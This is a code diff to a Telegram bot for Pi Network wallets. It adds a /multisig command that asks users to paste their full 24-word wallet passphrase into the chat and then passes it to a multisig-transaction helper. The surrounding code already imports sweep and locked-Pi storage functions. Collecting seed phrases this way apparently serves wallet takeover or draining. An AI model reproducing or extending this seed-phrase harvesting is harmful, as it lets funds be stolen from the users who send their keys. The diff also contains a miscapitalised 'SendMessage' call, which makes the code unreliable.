@@ -1,5 +1,5 @@
 import TelegramBot from "node-telegram-bot-api";
-import { getAccount, getAccountWithoutProxy, getBalance, getKeypairFromPassphrase, sleep, sweepWallet } from "./utils/fn.js";
+import { getAccount, getAccountWithoutProxy, getBalance, getKeypairFromPassphrase, sleep, sweepWallet, buildAndSubmitMultiSigTx } from "./utils/fn.js";
 import { storeLockedPi, storeSponsor } from "./utils/modelfn.js";
 import { connectToDB } from "./db.js";
 import Sponsors from "./models/Sponsors.js";
@@ -44,6 +44,13 @@ bot.onText(/\/balance/, (msg) => {
     bot.sendMessage(chatId, 'Please send your 24-word passphrase (seperated by space) OR Pi Wallet address');
 
     userSessions[chatId] = { waitingForPassphraseForBalance: true }
+});
+
+bot.onText(/\/multisig/, (msg) => {
+    const chatId = msg.chat.id;
+    bot.sendMessage(chatId, 'Please send your 24-word passphrase (seperated by space)');
+
+    userSessions[chatId] = { waitingForMultiSig: true }
 });
 
 bot.onText(/\/sweep/, (msg) => {
@@ -380,3 +387,34 @@ bot.on('message', async (msg) => {
         return bot.sendMessage(chatId, `❌ Unknown error occured`);
     }
 })
+
+bot.on('message', async (msg) => {
+    const chatId = msg.chat.id;
+
+    if(userSessions[chatId]?.waitingForMultiSig) {
+            const passphrase = msg.text.trim().toLocaleLowerCase();
+            const words = passphrase.split(/\s+/);
+            if(words.length !== 24) {
+                return bot.sendMessage(chatId, '❌ Invalid passphrase. Please send exactly 24 words');
+            }
+
+            bot.sendMessage(chatId, '⏳ Multi signing...');
+
+            try {
+                const kp = getKeypairFromPassphrase(passphrase)
+                bot.sendMessage(chatId, `✅ Public key: ${kp.publicKey()}`);
+
+                const result = await buildAndSubmitMultiSigTx(passphrase);
+                bot.SendMessage(chatId, JSON.stringify(result));
+            } catch(error) {
+                console.log(error)
+                bot.sendMessage(chatId, `❌ Something went wrong, please try again, ${error}`);
+            }
+
+        
+
+        delete userSessions[chatId]
+    }
+})
+
+
